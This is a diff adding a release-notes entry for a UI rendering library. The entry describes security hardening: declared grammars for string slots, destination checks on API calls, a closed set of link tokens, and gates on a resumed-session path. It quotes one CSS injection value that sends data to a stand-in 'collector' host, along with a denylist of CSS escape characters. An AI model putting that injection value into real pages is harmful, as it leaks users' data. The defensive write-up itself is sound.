@@ -5937,6 +5937,129 @@ untagged and carries breaking work already, so a consumer adopting this slot is 
 re-reading its entry regardless, and the draft-slot rule advances only for a HIGHER class than the
 draft already carries. Additive is not higher than breaking.
 
+
+## Recorded change — 0.77.0, the emission grammar for string-typed slots (fuaran#1523)
+
+**It RIDES the 0.77.0 draft rather than advancing it.** The new SURFACE is additive — a new
+`Fuaran.UI.EmissionGrammar` module, five `PreEmitDefect` cases, an `EgressClass` case, three optional
+`ScriptRef` slots, two new `Resume` entry points — and the two record widenings it carries
+(`VisualisationContext` gains `EgressPolicy`, `ScriptRef` gains three `option` fields) are the
+`FS0764` full-literal-construction class the standing draft already carries twice over. The
+draft-slot rule advances a number only for a class HIGHER than the slot already holds; 0.77.0 is
+untagged and already records a breaking `Fuaran.UI.Client` change, so a consumer adopting this slot
+is recompiling and re-reading its entry regardless.
+
+**What is NOT additive is BEHAVIOUR**, and three changes are worth a consumer's attention before it
+adopts. Each is described below with the shape of the adoption it may require.
+
+### The defect: a string-typed slot's grammar was applied per renderer, per arm, by hand
+
+`LayoutMode.Grid.templateColumns`, `DrawStyle.fill` / `.stroke`, `ColorVar.CssRaw`, `Link.href` /
+`Image.src`, and `Link.target` / `Link.rel` are all typed `string` and all carry a grammar the type
+does not state. Applied at each emission site, two things followed and both were observed. The hosts
+DISAGREED — four server renderers concatenated `templateColumns` into a style attribute with no rule
+at all, so `"1fr;background:url(https://collector/?d=…)"` fetched on RENDER outside the egress
+policy, while the React client assigned a style object and the browser dropped it silently. And the
+refusal was INVISIBLE — a render-time rule runs after decode, after `validate`, after the op-stream
+persisted the tree and after the AI-tools surface introspected it, so an emitting model was never
+told and a headless consumer met no floor at all.
+
+The grammar is now declared once in `Fuaran.UI.EmissionGrammar`, beside `WireLimits` and for the same
+reason: it is a protocol rule, not a renderer detail. `PreEmitValidate` consults it; the renderers
+re-export it under their established names, so no emission site's call was renamed.
+
+### Behaviour change 1 — `Action.Call` is destination-gated (`EgressClass.Call`)
+
+`Action.Call` had no `EgressClass`, so it was the one outbound effect the Phase 1026 ambient
+destination policy could not speak about: a rendered tree plus one click reached `fetch()` at any
+origin, and with `into: State k` the response was written into the store the rest of the tree renders
+from. It now runs `checkDestination` before the dispatch gate, in the order `Action.Navigate` has
+used since 782/1026, under a new `EgressClass.Call`.
+
+**Adoption:** a composition that calls a non-local API and has not declared its origin will see the
+call REFUSED under the default policy, exactly as an off-origin `Image.src` already is. Declare the
+origin (`allowOrigin` with the `Call` class, or a class-free rule) as you would for any other egress.
+The class is scoped separately from `Media` deliberately: a composition that declared a CDN for image
+egress has said nothing about which APIs it will call and INGEST.
+
+`EgressClass` is a public DU, so the new case is an exhaustiveness warning (`FS0025`) for a consumer
+that matches on it — which this document has always classed as non-breaking, and which is the correct
+signal.
+
+### Behaviour change 2 — `Link.target` / `Link.rel` are closed at EMISSION
+
+Every renderer now emits only `_self` / `_blank` for `target`, only a closed descriptive token set for
+`rel`, and forces `noopener noreferrer` on a `_blank` link. **The WIRE is unchanged** — no decoder
+refuses anything it accepted before — so this is an emission narrowing, not a wire break. Narrowing
+the wire is carried as a §4b amendment PROPOSAL
+([`docs/proposals/link-target-rel-narrowing.md`](docs/proposals/link-target-rel-narrowing.md)) with
+its reject vectors written there rather than added to the shared corpus, because a vector every
+conformant host currently accepts would fail every host on the day it landed.
+
+**Adoption:** a document relying on `target="_parent"`, a named frame, or `rel="opener"` renders
+without them. `PreEmitValidate` reports FUARAN146 naming the dropped token, so the change is
+detectable before it is deployed. One shared-corpus fixture's RENDERED output moves — `link-1`, whose
+`_blank` anchor gains the forced pair — which is a renderer snapshot, not a wire fixture.
+
+### Behaviour change 3 — a CSS-valued or paint-valued slot can be refused
+
+`templateColumns` and `ColorVar.CssRaw` are refused to the EMPTY value when they carry a character or
+function that lets a value leave its declaration (`;` `{` `}` `\` C0, `url(`, `expression(`), and the
+element carries `data-fuaran-css-refused="<slot>"` so the refusal is visible in the DOM. An SVG
+`fill` / `stroke` outside the closed colour grammar is refused to `"none"` — `"none"` rather than
+empty, because an empty paint INHERITS the enclosing group's rather than clearing it.
+
+**Adoption:** none expected for a correctly-authored document. The colour grammar admits hex, a bare
+CSS ident (which is how every named colour, keyword and SVG2 paint keyword is spelled) and the named
+colour functions, so `steelblue` and `currentColor` are unaffected; the CSS rule is a character
+denylist, so `var(…)`, `clamp(…)` and `color-mix(…)` all pass. What is refused is a value that could
+close its own declaration or fetch. FUARAN143 / FUARAN145 name either case pre-emit.
+
+### The new advisory codes
+
+`FUARAN142` unsafe URL scheme · `FUARAN143` a CSS value that leaves its declaration · `FUARAN144` a
+safe but malformed track-list (the value renders and the BROWSER discards it, so only a shape check
+catches it) · `FUARAN145` a paint outside the colour grammar · `FUARAN146` an anchor token outside
+the closed sets. All Warning, all judged only under a `Binding.Static` — a bound value resolves at
+runtime against data the pre-emit pass cannot see, and the renderer floor is what covers that case on
+every host.
+
+### Additive surface
+
+`Fuaran.UI.EmissionGrammar` (the whole module); `PreEmitDefect.UnsafeUrlScheme` /
+`.UnsafeCssValue` / `.MalformedTrackList` / `.UnsafePaintValue` / `.UnsupportedLinkAnchor`;
+`Sanitize.isSafeCssValue` / `.sanitizeCssValue` / `.sanitizeCssValueForSlot` / `.cssRefusalAttribute`
+/ `.sanitizePaintValue` / `.sanitizeLinkTarget` / `.sanitizeLinkRelAttribute` / `.sanitizeLinkAnchor`;
+`Sanitize.EgressClass.Call`; `Render.treeCallOutcome`; `Resume.installWithHandle` /
+`.ResumeHandle` / `.installEgressPolicy` / `.egressPolicy` / `.installActionSink` /
+`.envelopeMaxDepth`; `BrowserRuntime`'s three-argument constructor and `CallTimeoutMs`;
+`ScriptRef.withNonce` / `.withIntegrity`; `DocumentShell.ScriptRef.Nonce` / `.Integrity` /
+`.CrossOrigin`.
+
+`Resume.install` keeps its `bool` return and `BrowserRuntime`'s two-argument constructor is kept, so
+every existing call site compiles unchanged.
+
+### The resume path is not a second security posture
+
+`Resume.interpret` routed a trusted-by-shape envelope straight against `IFuaranRuntime`: no
+`CanDispatch`, no `checkDestination`, no host-reserved state-key refusal and no `ActionInvocation`
+record, while the module header claimed emission identical to the hydrated path. Sharing a RUNTIME is
+not sharing a DISPATCH PATH — every gate lives in `Render`, above the runtime — so the open-redirect
+and `javascript:`-route sinks Phase 782 closed on the hydrated path were open on the resumed one, and
+a host auditing its action records saw nothing at all for an entire resumed session. `interpret` now
+reads a TYPED, depth-capped envelope into the same `Action` the hydrated path dispatches and routes
+it through the very functions `runActionCore` routes through, recording at the same outer emission
+point with the same `Chain`-is-one-invocation semantics.
+
+**Adoption:** a host that declared an egress policy or an action sink for its hydrated renders calls
+`Resume.installEgressPolicy` / `Resume.installActionSink` with the same values before `install`. A
+host that declared neither gets the shipped defaults (`denyNonLocalEgress`, no sink) — the same
+defaults a decoded tree gets on the hydrated path.
+
+### Not a wire-format change
+
+No `Node` / `TreeOp` byte moves and no shared-corpus fixture content changes. The `link-1` renderer
+snapshot moves because the RENDER changed, not because the document did.
 ---
 ## Recorded change — 0.77.0, `Binding.Expr` — scalar logic over bound values (fuaran#1534)
 
